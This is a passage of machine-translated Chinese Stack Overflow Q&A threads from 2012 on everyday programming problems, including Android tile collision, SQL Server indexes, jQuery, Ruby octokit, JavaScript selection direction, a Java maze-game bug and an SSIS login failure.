    public int getType() {
        // TODO Auto-generated method stub
        return type;
    }
    public Paint getColor() {
        return color;
    }

    public void setColor(int color) {
        this.color.setColor(color);
    }

    public void drawTile(Canvas canvas){
        canvas.drawRect(bounds, color);
    }
} 
```

**这是我的英雄课**

```
 class Hero{
    private static final int SIZE = 30;
    //Coordinates 
    int X = 60;
    int Y = 60;
    int sx=30, sy=30;
    private Paint paint = new Paint();
    public Rect Bounds = new Rect(X,Y,X+30,Y+30);
    boolean solid = true;

    //Map Things
    Map map;

    public Hero(Map map){
        this.map = map;
        paint.setColor(Color.RED);
        paint.setStyle(Style.FILL_AND_STROKE);

        location();
    }

    private void location() {

        for(int index = 0; index<map.tiles.size(); index++){
            if(map.tiles.get(index).getType() == 2){
                this.X = map.tiles.get(index).getX();
                this.Y = map.tiles.get(index).getY();

            }
        }

    }

    public void move(int KeyCode) {
        switch(KeyCode){

        case KeyEvent.KEYCODE_DPAD_DOWN:
            {if(Collision()){Y+=sy;} break;}
        case KeyEvent.KEYCODE_DPAD_UP:
            {Y-=sy; break;}
        case KeyEvent.KEYCODE_DPAD_LEFT:
            {X-=sx; break;}
        case KeyEvent.KEYCODE_DPAD_RIGHT:
            {X+=sx; break;}
        }

    }

    private boolean Collision() {
        for(int index = 0; index< map.tiles.size(); index++){
            if(Rect.intersects(map.tiles.get(index).bounds, this.Bounds)){
                return map.tiles.get(index).walkable;}  
        }
        return false;
    }

    public int getX() {
        return X;
    }

    public int getY() {
        return Y;
    }

    public void setX(int x) {
        X = x;
    }

    public void setY(int y) {
        Y = y;
    }

    public void position(int x, int y){
        X = x;
        Y = y;

    }

    public void update(){
        Bounds.set(X, Y, (X+SIZE), (Y+SIZE));

    }

    public void Draw(Canvas canvas){
        canvas.drawRect(Bounds, paint);
        canvas.drawText("Player", Bounds.left, Bounds.top-5, paint);
    }
} 
```

如何检查碰撞？我应该循环每一个瓷砖然后检查玩家的新坐标是否会发生碰撞？

这可能不是正确的方法，但它有效。我为每个移动方向向右，向左，向上和向下添加了方法，如下所示

```
private void moveLeft() {
    for(int index = 0 ; index < map.tiles.size();index++){
        if(yCoord-1 == map.tiles.get(index).yCoord && xCoord == map.tiles.get(index).xCoord){
            if(map.tiles.get(index).walkable){  
            X-=SIZE;
                //My coordinates are flipped for some reason my Xs are Ys and Ys are Xs
                yCoord-=1;
                break;
            }
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T01:02:16.150

您必须记录英雄的最后位置，在每次移动事件中，您可以检查相对于英雄方向的下一个图块。正如您在二维矩阵中实现的那样，因此，如果英雄的位置是地图 [0] [0] 并且玩家一次下降了一个位置，那么地图中的相对位置即地图 [1] [0]。这样你就可以最大限度地减少比较。每个方向都有二维权重，例如`up movement can have [CurrentPosition.x-1] [CurrentPosition.y-1], Left can have [CurrentPosition.x] [CurrentPosition.y+1] etc....`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:36:50.750

如果您指的是检查您的瓷砖是否“可行走”，那么每次您的玩家决定移动英雄时（因此可能是在移动操纵杆或点击时）您需要确定您的英雄将在哪个瓷砖上，然后检查该图块以查看它是否已将 walkable 设置为 true。您的代码已经很好地实现了这一目标。

如果您指的是与其他实体（例如 NPC）的碰撞，那么当玩家决定移动英雄并确定新位置是​​否与其中一个实体的位置相同时，您将需要获取每个实体的位置可碰撞的实体。

类似于以下内容：

```
case KeyEvent.KEYCODE_DPAD_DOWN: {
int target = hero.getY() + 1;
if(map.getTile(hero.getX(), target).isWalkable())
   hero.setY(target);
break;
} 
```

# sql-server-2008 - sql server 会删除列重建索引吗？

> ID：12648882
> 
> 赞同：1
> 
> 时间：2012-09-29T00:25:17.833
> 
> 标签：sql-server-2008, indexing

任何人都知道当我从表中删除一列时索引会发生什么？

SQL Server 是否重建该索引？如果是聚集索引呢？

我有一个 1.5 亿行的表，我需要删除一列。如果它作为聚集索引排序，这会重建表吗？还是索引只知道它的一列被删除了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T15:00:32.987

这取决于列。如果该列用作任何索引（聚集或非聚集）中的索引列，则不能删除它，除非先删除受影响的索引。

如果该列不用作索引列，则可以将其删除，并且**不会**重建聚集索引。但是，在重建聚集索引之前，表的已用空间也不会改变。

编辑：参考：http: [//msdn.microsoft.com/en-us/library/ms190273.aspx](http://msdn.microsoft.com/en-us/library/ms190273.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:32:34.667

这不是索引可以“理解”的东西。只有在查询中使用了索引中使用的所有列时，查询引擎才能使用复合索引。这是一个多级索引，带有索引索引（如果有意义的话）。索引定义中的列顺序构成了所构建的物理索引。如果您删除该列，您将不得不删除此索引并构建一个新索引。

# jquery - 在 HTML 选择后放置一个元素并淡出

> ID：12648886
> 
> 赞同：0
> 
> 时间：2012-09-29T00:26:25.653
> 
> 标签：jquery, html, select, image

如何`img`在 a 之后放置一个元素`select`并让它淡出？

到目前为止我已经尝试过：

*   `appendTo`不适合，因为它将元素放置在元素内部`select`。
*   `after`需要从`select`元素中调用，因此链接 a`fade`将作用于`select`而不是`img`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T00:30:00.600

尝试[`.insertAfter()`](http://api.jquery.com/insertAfter/)

使用此链接效果将附加到图像元素。

```
$(function() {
    $('<img class="pub-cover" src="http://i.imgur.com/vER9H.png" />')                  
        .insertAfter('select').fadeOut('slow')
}); 
```

[演示](http://jsfiddle.net/sushanth009/RmRTp/)

# php - 插入图像代替文本

> ID：12648887
> 
> 赞同：0
> 
> 时间：2012-09-29T00:26:41.270
> 
> 标签：php, jquery, image, button

我想在下面的代码中用图像（previous.png 和 next.png）替换“prev”和“next”，我只是不确定正确的语法。有任何想法吗？

```
if ($arrOptions['_slider_controls']){
            $output .= '<div class="thethe-image-slider-controls-prev thethe-previous thethe-image-slider-controls" id="thethe_image_slider'.$oPost->ID.'-previous"></div>
                    <div class="thethe-image-slider-controls-pause thethe-image-slider-controls thethe-';
            $output .=$arrOptions['_slider_autoplay'] ? 'pause' : 'play';
            $output .='" id="thethe_image_slider'.$oPost->ID.'-pause"></div>
                    <div class="thethe-image-slider-controls-next thethe-image-slider-controls thethe-next" id="thethe_image_slider'.$oPost->ID.'-next"></div>';
        } 
```

如果重要的话，我正在为 Wordpress 使用[TheThe Image Slider](http://wordpress.org/extend/plugins/thethe-image-slider/)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T01:23:53.813

我想我明白你想做什么。图像滑块很可能会即时插入 Prev 和 Next 控件。它们甚至可能不是文本，它们可能已经是图像。如果您有一个工作演示的链接，它会更容易看到，但我会执行以下操作：

1.  确定 Prev 和 Next 是显示为文本还是图像。使用诸如 Chrome 开发者工具之类的工具来查看页面的结构，您就可以弄清楚这一点。它可能已经是图像的原因是他们可以使用特定的字体而不会感到头疼。

2.  如果它们是图像，请找到图像的来源。如果它在插件的 css 中，您可以在那里更改它。如果它是插入到 html 中的图像文件，您可以用自己的覆盖它，只需给它相同的名称。

3.  如果它真的只是文本，那么您可以查看滑块插件文件并找到它的插入位置。“prev”或“next”的 CTRL+F 可能有助于加快速度。仔细更改该实例以插入您的图像。

请注意，如果您编辑滑块插件文件，那么如果您将插件更新到较新版本，您的更改可能会消失，因此保存有关您所做更改的注释将在未来有所帮助。

编辑：您的演示中没有一个使用 prev/next 一词，但它们确实使用了背景图片：[http ://thethefly.com/wp-content/plugins/thethe-image-slider/style/skins/frame- black/buttons.png](http://thethefly.com/wp-content/plugins/thethe-image-slider/style/skins/frame-black/buttons.png) 如果您在安装中找到相应的文件，您应该能够用您自己的文件覆盖它。但更好的是，该插件看起来是可换肤的。我没有看到有关如何操作的任何信息，但查看文件并查看是否有任何可以编辑的皮肤/主题/配置文件。如果有的话，还要在它附带的 CSS 文件中寻找可编辑的东西。

再次编辑：我刚刚再次阅读了您的评论，我意识到您的评论可能会有所不同。您可以访问他们的任何主题吗？如果默认使用图像，则修改其中一个可能会更容易。还要确定使用 chrome 浏览器右键单击它并选择“检查元素”，您可以确切地看到发生了什么。如果您使用其他浏览器，其他浏览器也具有类似的功能。

# ruby - 使用 Ruby & Github API 按日期过滤提交

> ID：12648888
> 
> 赞同：3
> 
> 时间：2012-09-29T00:26:43.610
> 
> 标签：ruby, github, jekyll

我正在使用实现 Github API v3的[ruby​​ gem 'octokit' 。](https://github.com/pengwynn/octokit)大多数情况下效果很好，但我似乎无法按日期过滤。我相信我的语法和时间格式是正确的，但似乎我的选项被忽略了，API 返回过去的 35 个条目，无论从开始日期还是截止日期。

这是一个最小的可重现示例（在安装 octokit gem 之后）。

```
require 'octokit'
require 'time'

@day = "2012-09-27"
@until = DateTime.parse(@date).iso8601
@since = (DateTime.parse(@day) - 60*60*48).iso8601
a = Octokit.commits({:username => "cboettig", :repo => "labnotebook", :since => @since, :until => @until}) 
```

查看最后一个条目的输出日期

```
a.last.commit.author.date 
```

明确的一天也不起作用

```
b = Octokit.commits({:username => "cboettig", :repo => "labnotebook", :since => "2012-09-27T00:00:00+00:00"})

b.last.commit.author.date 
```

我在这两个例子中得到的日期都是从八月开始的，超出了给定的指定范围。我错过了什么？

**背景**：我正在尝试编写一个小的 Jekyll 插件，该插件使用 API 返回在发布当天对指定仓库所做的提交。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T20:40:43.517

[joeyw 在这里对这个问题给出了很好的回答](https://github.com/pengwynn/octokit/issues/141#issuecomment-9002057)。

第二个参数应该是 sha 或分支，options 应该是第三个参数，例如

```
Octokit.commits("cboettig/labnotebook", "master", :since => "2012-09-28T00:00:00+00:00").length 
```

或者

```
Octokit.commits("cboettig/labnotebook", nil, :since => "2012-09-28T00:00:00+00:00").length 
```

工作得很好。 [这是我对应的jekyll插件](https://github.com/cboettig/jekyll-labnotebook-plugins/blob/master/octokit.rb)

# javascript - 如何确定内容可编辑 DIV 中的选择是从左到右还是从右到左

> ID：12648891
> 
> 赞同：3
> 
> 时间：2012-09-29T00:27:52.997
> 
> 标签：javascript, contenteditable

在内容可编辑的 DIV 中，我想确定用户是从左到右还是从右到左进行选择。有人有针对浏览器 Firefox、Chrome、Safari、Opera 的 Javascript 解决方案吗？如果可能的话，还有一个用于 IE 的？

```
<div id="editor" contenteditable>
Selection from Cursor end | here <strong>over bold</strong> to Cursor start | here.
</div> 
```

我在这里准备了 jsFiddle 中的代码：http: [//jsfiddle.net/ecUka/](http://jsfiddle.net/ecUka/)

提前致谢 ：-）

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-29T10:56:08.460

这是一个函数，它使用这样一个事实，即将 DOM 范围的结尾设置为文档中比范围开始更早的点会折叠范围。

演示：http: [//jsfiddle.net/97MDR/17/](http://jsfiddle.net/97MDR/17/)

代码：

```
function isSelectionBackwards() {
    var backwards = false;
    if (window.getSelection) {
        var sel = window.getSelection();
        if (!sel.isCollapsed) {
            var range = document.createRange();
            range.setStart(sel.anchorNode, sel.anchorOffset);
            range.setEnd(sel.focusNode, sel.focusOffset);
            backwards = range.collapsed;
        }
    }
    return backwards;
} 
```

它适用于所有主流浏览器，除了 IE < 9，它不支持与其他浏览器相同的 Range 和 Selection API。

对于 IE < 9，选择 API 中根本没有任何内容可以告诉您选择方向。我能建议的最好的方法是使用该[`selectionchange`](http://msdn.microsoft.com/en-us/library/ms537845%28v=vs.85%29.aspx)事件来跟踪先前选择的范围，并查看每次触发时哪一端发生了变化。它似乎在以下示例中有效，但除此之外没有进行任何测试，因此使用风险自负。

演示：http: [//jsfiddle.net/97MDR/18/](http://jsfiddle.net/97MDR/18/)

附加代码：

```
var selectedRange, selectionBackwards;

document.onselectionchange = function(evt) {
    evt = evt || window.event;
    var sel = document.selection;
    if (sel && sel.type !== "Control") {
        if (sel.type == "Text") {
            // Selection is not collapsed, so compare range end points
            var newRange = sel.createRange();
            if (selectedRange) {
                var startChanged = (newRange.compareEndPoints("StartToStart", selectedRange) != 0);
                var endChanged = (newRange.compareEndPoints("EndToEnd", selectedRange) != 0);

                if (startChanged && !endChanged) {
                    selectionBackwards = true;
                } else if (endChanged && !startChanged) {
                    selectionBackwards = false;
                } else if (startChanged && endChanged) {
                    // Both ends have changed, which is confusing.
                    // I suspect this can happen when the selection snaps
                    // to words. In this case we can tell nothing, so leave
                    // selectionBackwards alone.
                } else {
                    // Neither end has changed, so we can tell nothing.
                }
            }

            selectedRange = newRange;
        } else {
            // Selection is collapsed
            selectionBackwards = false;
        }
    }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-29T16:59:29.240

```
range.setStart(anchorNode, anchorOffset);
range.setEnd(focusNode, focusOffset);
if(range.collapsed == false){
colsole.log('forward Selected');
}else{
colsole.log('backward Selected');
}
```

# java - Java：编写一个简单的迷宫游戏

> ID：12648898
> 
> 赞同：1
> 
> 时间：2012-09-29T00:29:56.823
> 
> 标签：java, arrays, string, loops

我正在用java编写一个简单的迷宫游戏。该程序从输入文件中读取文本“地图”以用于迷宫布局。规则很简单：通过用户输入导航迷宫（由 2D 数组表示）并避免塌陷（由 Xs 表示），然后到达标记为“T”的位置的“P”（玩家）。现在，我已经编写了大部分代码，只是让它正常工作的问题。我已经将大部分游戏设置为使用 while 循环运行，布尔值“得到宝藏”设置为 false。一旦这成为现实，它应该结束游戏。

但是，我没有编写玩家实际获得宝藏的情况，所以我想知道为什么我的代码只是吐出“恭喜！你找到了宝藏！” 没有别的了。如果有人能对此有所了解，我将不胜感激。我的代码有点混乱，因为我们的老师刚刚开始学习方法、构造函数和创建我们自己的类。这是我到目前为止的代码：

```
import java.util.*;
import java.io.File;
public class MazeGame {

public static void main(String[] args) throws Exception {
    Scanner scan = new Scanner(new File("maze.txt"));
    Scanner user = new Scanner(System.in);
    int rows = scan.nextInt();
    int columns = scan.nextInt();
    int px = 0;
    int py = 0;
    String [][] maze = new String[rows][columns];
    String junk = scan.nextLine();

    for (int i = 0; i < rows; i++){
        String temp = scan.nextLine();
        String[] arrayPasser = temp.split("");
        for (int j = 0; j < columns; j++){
            maze[i][j] = arrayPasser[i];
        }
    }

    boolean gotTreasure = false;

    while (gotTreasure = false){
        for (int i = 0; i < rows; i++){
            for (int j = 0; j < columns; j++){
                System.out.print(maze[i][j]);
                System.out.print(" ");
        }
            System.out.print("\n");
      }

        System.out.printf("\n");
        System.out.println("You may:");
        System.out.println("1) Move up");
        System.out.println("2) Move down");
        System.out.println("3) Move left");
        System.out.println("4) Move right");
        System.out.println("0) Quit");
        int choice = user.nextInt();
        int i = 0;

        if (choice == 1 && i >= 0 && i < columns){
            for (int k = 0; k < rows; k++){
                for (int l = 0; l < columns; l++){
                    if (maze[k][l].equals(maze[px][py]) && maze[px][py-1].equals("X") == false){
                        maze[px][py] = ".";
                        maze[k][l-1] = "P";
                        maze[px][py] = maze[k][l-1];
                    }else if (maze[px][py-1] == "X"){
                        System.out.println("Cannot move into a cave-in! Try something else.");
                    }else {
                    continue;}

                    }
                }
            }
        else if (choice == 2 && i >= 0 && i < columns){
            for (int k = 0; k < rows; k++){
                for (int l = 0; l < columns; l++){
                    if (maze[k][l].equals(maze[px][py]) && maze[px][py+1].equals("X") == false){
                        maze[px][py] = ".";
                        maze[k][l+1] = "P";
                        maze[px][py] = maze[k][l+1];
                    }else if (maze[px][py+1] == "X"){
                        System.out.println("Cannot move into a cave-in! Try something else.");
                    }else {
                    continue;}

               }
             }
            }
        else if (choice == 3 && i >= 0 && i < columns){
            for (int k = 0; k < rows; k++){
                for (int l = 0; l < columns; l++){
                    if (maze[k][l].equals(maze[px][py]) && maze[px-1][py].equals("X") == false){
                        maze[px][py] = ".";
                        maze[k-1][l] = "P";
                        maze[px][py] = maze[k-1][l];
                    }else if (maze[px-1][py] == "X"){
                        System.out.println("Cannot move into a cave-in! Try something else.");
                    }else {
                    continue;}
                }
            }
        }
        else if (choice == 4 && i >= 0 && i < columns){
            for (int k = 0; k < rows; k++){
                for (int l = 0; l < columns; l++){
                    if (maze[k][l].equals(maze[px][py]) && maze[px+1][py].equals("X") == false){
                        maze[px][py] = ".";
                        maze[k+1][l] = "P";
                        maze[px][py] = maze[k+1][l];
                    }else if (maze[px+1][py] == "X"){
                        System.out.println("Cannot move into a cave-in! Try something else.");
                    }else {
                    continue;}
                }
            }
        }
        else if (choice == 0){
            System.exit(0);
        }
    }

    System.out.println("Congratulations, you found the treasure!");

    scan.close();
    user.close();
        }

    } 
```

这是示例输入文件：

*   5 5
*   P.XX.
*   。X...
*   ...X。
*   XXX..
*   ..X..

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-29T00:46:19.773

（叹气）一等号而不是二。您有“while (gotTreasure = false)”，它将值 false 分配给 gotTreasure 并且不进入循环。将其更改为“while (gotTreasure == false) 并进入循环。

对于未来的问题：请尝试自己弄清楚发生了什么，并让其他人知道您尝试了什么以及您对此有什么具体问题。有争议的是，我应该放弃它，因为它本质上是一个为您调试代码的请求。学会调试自己。如果跟踪语句没有被执行，那么很可能此时的代码没有被执行。如果没有进入循环，几乎可以肯定是因为进入循环的条件不存在。

学习使用调试器——eclipse（我敢肯定，还有很多其他的开发工具）有一个很好的调试器。找出断点是什么，如何设置它并在命中时检查变量，并从那里找出问题所在。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-29T00:47:01.927

如果这是一个错字忽略这个，如果它不是

```
 while (gotTreasure = false) is wrong. 
```

您没有检查 gotTreasure 是否为假，而是将其分配为假。

检查 gotTreasure 是否为假，使用 == 运算符

```
 while(gotTreasure==false) 
```

让我知道这是否是一种类型，我将删除答案。:)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-29T00:48:36.360

您的 while 循环条件有一个简单的错误，

代替，

```
while (gotTreasure = false) 
```

你应该使用，

```
while (gotTreasure == false) 
```

在第一种情况下，您将 false 分配给 gotTreasure，而在第二种情况下，您正在评估 gotTreasure 是否为 false。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-08-16T12:00:10.347

我重构了你的代码，因为有很多糟糕的编程风格。现在游戏应该按预期运行。

1.  我使用了一个构造器和很多方法，将你的大方法分成小部分。-> 更容易理解。
2.  我声明了属性（在整个类中都知道），以便不同的方法可以使用这个变量。
3.  您经常检查 if(variable == false) 之类的条件。尝试使用 if(!variable)，感叹号否定变量的值。
4.  您的 update-Methode 有很多冗余。通过添加以下 switch-case-Part，我可以区分不同的方向：

通过用户输入设置方向的通用代码：

```
switch (choice){
    case 0: System.exit(0);
    case 1: xdir = 0; ydir = -1; break;
    case 2: xdir = 0; ydir =1; break;
    case 3: xdir = -1; ydir = 0; break;
    case 4: xdir = 1; ydir = 0; break;
} 
```

之后我可以通过将 xdir 添加到 x 并将 ydir 添加到 y 来计算新位置。如果您尝试检查新位置是否在数组的范围内，这很方便。

```
//1\. Check if the new position is in the array.
if (x+xdir >= 0 && x+xdir <columns && y+ydir >=0 && y+ydir < rows){ 
```

**下面是整个班级：**

```
import java.util.Scanner;
import java.io.File;
import java.io.FileNotFoundException;

public class MazeGame2 {
    Scanner scan;
    Scanner user;
    int rows;
    int columns;
    String [][] maze;

    int x; //Player x-Position 
    int y; //Player y-Position
    boolean gotTreasure;

    /**
     * Konstruktor for the class.
     */
    public MazeGame2(){
        init(); 
        game();
        scan.close();
        user.close();  
    }

    /**
     * Initialisation of the maze and all attributes.
     */
    public void init(){
        user = new Scanner(System.in); //Scanner for Userinput

        /********************************
         * Scanning the maze from a file. 
         */
        //1\. Open the file. Has to be in a try-catch-Bracket, because the file might not be there.
        try{
            scan = new Scanner(new File("maze.txt"));
        }catch(FileNotFoundException e){
            e.printStackTrace();
        }

        //2\. Scan the dimensions of the maze.
        rows = scan.nextInt();
        columns = scan.nextInt();
        scan.nextLine(); // So that the next Line can be scanned.

        maze = new String[rows][columns];//Create the maze-Array with the right dimensions.

        for (int i = 0; i < rows; i++){
            String temp = scan.nextLine(); //Scan one line.
            for (int j = 0; j < columns; j++){
                maze[i][j] = temp.substring(j, j+1);//Put every character in the maze
                if (maze[i][j].equals("P")){ //Look out for the Player-Position
                    x = j; 
                    y = i;
                }
            }
        }  
        gotTreasure = false;
    }

    /**
     * Prints the Input of the maze-Array. But only if the spots are visible by the player.
     */
    public void printMaze(){
        for (int i = 0; i < rows; i++){
            for (int j = 0; j < columns; j++){
                System.out.print(maze[i][j]);
                System.out.print(" ");
        }
        System.out.println();
      }  
    }

    /**
     * Prints the possebilities to move by the player.
     */
    public void printUserPossebilities(){
        System.out.println();
        System.out.println("You may:");
        System.out.println("1) Move up");
        System.out.println("2) Move down");
        System.out.println("3) Move left");
        System.out.println("4) Move right");
        System.out.println("0) Quit");      
    }

    /**
     * 
     */
    public void update(int choice){
        int xdir=0; 
        int ydir=0;
        // Update the direction based on the userChoice
        switch (choice){
            case 0: System.exit(0);
            case 1: xdir = 0; ydir = -1; break;
            case 2: xdir = 0; ydir =1; break;
            case 3: xdir = -1; ydir = 0; break;
            case 4: xdir = 1; ydir = 0; break;
        }

        /**
         * Update the situation based on the current direction and step.
         */
        //1\. Check if the new position is in the array.
        if (x+xdir >= 0 && x+xdir <columns && y+ydir >=0 && y+ydir < rows){
            //2\. Check if a step is possible
            if (maze[y+ydir][x+xdir].equals("X")){
                System.out.println("Cannot move into a cave-in! Try something else.");
            }else{
                //3\. clear the P from the old Position
                maze[y][x] =".";
                //4\. Check if the Player is over the treasure
                if (maze[y+ydir][x+xdir].equals("T")){
                    gotTreasure = true;
                }
                x = x+xdir; 
                y = y + ydir; 
                maze[y][x] = "P"; //Show the new position of the player.
            }
        }else{
            System.out.println("That's not a possible Move.");
        }   
    }

    /**
     * The game-Methode that includes the game-loop and 
     */
    public void game(){
        while (!gotTreasure){
            //System.out.print('\u000C');
            printMaze(); 
            printUserPossebilities();
            int userInput = user.nextInt(); //Wait for userinput
            update(userInput);
        }
        //System.out.print('\u000C');
        printMaze();            
        System.out.println("Congratulations, you found the treasure!");  
    }

    public static void main(String[] args){
        MazeGame2 m = new MazeGame2();

    }

} 
```

# objective-c - UIDocument 保存到 URL 失败？

> ID：12648900
> 
> 赞同：3
> 
> 时间：2012-09-29T00:30:03.137
> 
> 标签：objective-c, ios

似乎从未调用完成处理程序块。这是否意味着保存失败？我在控制台中 po `self.document.fileURL`，这似乎是有效的。

```
[self.document saveToURL:self.document.fileURL forSaveOperation:UIDocumentSaveForCreating completionHandler:^(BOOL success) {
// set breakpoint here, but it won't stop
            [[[Fetcher alloc]init] fetchImageFromSring:HTTP_REQUEST inContext:self.document.managedObjectContext];
        }]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:49:58.883

无论保存是否成功，都应调用完成处理程序块

关于[苹果的completionHandler](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIDocument_Class/UIDocument/UIDocument.html)

> completionHandler
> 保存操作结束时执行的代码块。该块不返回任何值，只有一个参数：
> success
> 如果保存操作成功，则为 YES，否则为 NO。
> 在调用队列上调用此块。

你有没有在这一行设置断点以确保它运行

```
[self.document saveToURL:self.document.fileURL forSaveOperation:UIDocumentSaveForCreating completionHandler:^(BOOL success) { 
```

编辑
我相信问题可能是您使用的是哪种类型的调试器。[（来自this SO question）](https://stackoverflow.com/a/5949122/1015071)
确保您正在使用`lldb`

即使您不更改调试器，您也可以始终验证该块是否执行 `NSLog(@"block is running, save successfully - %d", success)`

# javascript - 来自 Google 自定义搜索的 Javascript 错误和 GET 请求失败

> ID：12648903
> 
> 赞同：4
> 
> 时间：2012-09-29T00:30:13.683
> 
> 标签：javascript, css, google-custom-search

我在我的网站中集成了一个自定义 Google 搜索引擎时遇到了问题。我在同一页面上还有其他一些 Google 元素，例如 +1 按钮和 G+ 徽章，但我已经隔离并验证了搜索元素实际上是罪魁祸首。

[问题如下： http](http://www.google.com/uds/api/ads/3.0/9f53ed6be164615d919d9e4bd4f7fe8d/search.I.js) ://www.google.com/uds/api/ads/3.0/9f53ed6be164615d919d9e4bd4f7fe8d/search.I.js的 GET 请求似乎失败（尽管搜索该站点仍然有效）。Chrome 中的开发控制台表示该请求是由他们的 jsapi 在第 21 行发起的，并以红色突出显示以下内容：

```
google.(anonymous function).d
  (anonymous function) 
```

我尝试了多种测试场景，包括在完全准系统的 HTML 页面上插入搜索框，但我得到了同样的错误。是什么导致请求失败？它只是在他们的末端（因此无法修复）吗？

编辑：相关代码

这都是从谷歌的代码生成器中逐字记录的。

这在之前`</head>`

```
<script>
  (function() {
    var cx = '004344714102800561193:mo5u_njahwy';
    var gcse = document.createElement('script'); gcse.type = 'text/javascript'; gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gcse, s);
  })();
</script> 
```

搜索框代码：

```
<gcse:searchbox-only></gcse:searchbox-only> 
```

搜索结果页面代码：

```
<gcse:searchresults-only></gcse:searchresults-only> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-11-25T21:53:17.397

您是否安装了 Adblock Plus 之类的广告拦截器？当我在 JSFiddle 中运行您的代码时出现此错误：

> 加载资源失败：net::ERR_BLOCKED_BY_CLIENT

看起来该错误通常是由阻止文件加载的广告拦截器引起的：[Meta - 访问 StackOverflow 时 Chrome 控制台中的这些错误是什么？](https://meta.stackexchange.com/questions/223764/what-are-these-errors-about-in-the-chrome-console-when-visiting-stackoverflow)

# cocoa-touch - 如何一一绘制布局字形 - 核心文本

> ID：12648906
> 
> 赞同：1
> 
> 时间：2012-09-29T00:31:49.503
> 
> 标签：cocoa-touch, cocoa, fonts, core-graphics, core-text

我有一个可以在 Core Text 中绘制的字符串，如下所示：

```
CGContextShowGlyphsAtPoint(context, 0, 0, glyphs, glyphCount); 
```

效果很好。现在我需要单独绘制每个字形，在相同的位置，因为它们最终会使用上面那个漂亮的实用函数来绘制。而且我也不是用英语做的……有时在字形（变音符号）下方的字形下方有一个字形。

显然我需要这样的东西：

```
 CGPoint pt = CGPointMakeZero;
 for (int i = 0; i < glyphCount; i++) {
     CGContextShowGlyphsAtPoint(context, pt.x, pt.y, glyphs[i], 1);

     pt.x += <some quantity>
     pt.y += <some quantity>
 } 
```

不幸的是，我还没有弄清楚“一些数量”应该是什么......来自`CGContextGetAdvancesForGlyphs`和/或`CTFontGetVerticalTranslationsForGlyphs`和/或的一些指标组合`CGContextGetGlyphBBoxes`是我的第一个猜测，但我还没有让它工作。

有人有解决方案/其他想法吗？

如果你想要一个测试字符串，试试అక్త్రిన్。

（背景：我需要一个一个地绘制字形，因为我想在我的应用程序中对单个字形的外观进行自定义）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-25T23:22:28.643

在这里聚会晚了，但这个问题/答案组合显示了如何逐行计算布局，然后逐个字形计算布局。

[Core Text在iOS中计算字母框架](https://stackoverflow.com/questions/21443625/core-text-calculate-letter-frame-in-ios/21497660#21497660)

# sql-server - SSIS 作业无法连接到数据库

> ID：12648908
> 
> 赞同：2
> 
> 时间：2012-09-29T00:31:57.853
> 
> 标签：sql-server, ssis

成功部署我的 SSIS 包后，SQL Server 中的作业失败。显然这与连接到我的数据库的 SSIS 数据流有关，但我不知道出了什么问题。日志文件中的错误代码如下。

我将不胜感激任何建议。

```
Error: 2012-09-28 05:21:59.59     Code: 0xC0202009     Source: FG2_Upload Connection manager "haisql014\haisql014<c/>3184.TLGS.tlgsAdmin"     Description: SSIS Error Code DTS_E_OLEDBERROR.  
An OLE DB error has occurred. Error code: 0x80040E4D.  An OLE DB record is available.
Source: "Microsoft SQL Server Native Client 10.0"  Hresult: 0x80040E4D  Description: "Login failed for user 'tlgsAdmin'.".  End Error  
Error: 2012-09-28 05:21:59.60     Code: 0xC020801C     Source: Data Flow Task FG20 IVB OLE DB Destination [24]     Description: SSIS Error Code DTS_E_CANNOTACQUIRECONNECTIONFROMCONNECTIONMANAGER.  
The AcquireConnection method call to the connection manager "haisql014\haisql014<c/>3184.TLGS.tlgsAdmin" failed with error code 0xC0202009\.  
There may be error messages posted before this with more information on why the AcquireConnection method call failed.  End Error  
Error: 2012-09-28 05:21:59.60     Code: 0xC0047017     Source: Data Flow Task FG20 IVB SSIS.Pipeline     Description: component "OLE DB Destination" (24) failed validation and returned error code 0xC020801C.  End Error  
Error: 2012-09-28 05:21:59.60     Code: 0xC004700C     Source: Data Flow Task FG20 IVB SSIS.Pipeline     Description: One or more component failed validation.  End Error  
Error: 2012-09-28 05:21:59.60     Code: 0xC0024107     Source: Data Flow Task FG20 IVB      Description: There were errors during task validation.  End Error  
DTExec: The package execution returned DTSER_FAILURE (1).  
Started:  5:21:56 AM  Finished: 5:21:59 AM  Elapsed:  3.276 seconds.  
The package execution failed.  The step failed.,00:00:03,0,0,,,,0 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T09:03:10.460

看看下面的答案，它详细说明了当包在 Sql 作业上运行失败时如何解决这些类型的问题。

[对 sql 作业进行故障排除](https://stackoverflow.com/a/12555397/920359)

# .net - 使用 mercurial.net 获取 Outgoing 命令返回的变更集中的文件列表

> ID：12648909
> 
> 赞同：1
> 
> 时间：2012-09-29T00:32:00.960
> 
> 标签：.net, mercurial

我正在使用 mercurial.net 为管理工具添加 mercurial 的包装器。如果我使用 Outgoing 方法取回 IEnumerable，这些元素没有任何与它们关联的路径操作，因此我无法获取要修改的文件列表。是否可以对这些 Changeset 对象进行其他处理？

[http://mercurialnet.codeplex.com/](http://mercurialnet.codeplex.com/)

# java - 修改方法，使参数可以是实现 Comparable 的任何类型

> ID：12648912
> 
> 赞同：6
> 
> 时间：2012-09-29T00:32:55.503
> 
> 标签：java, generics

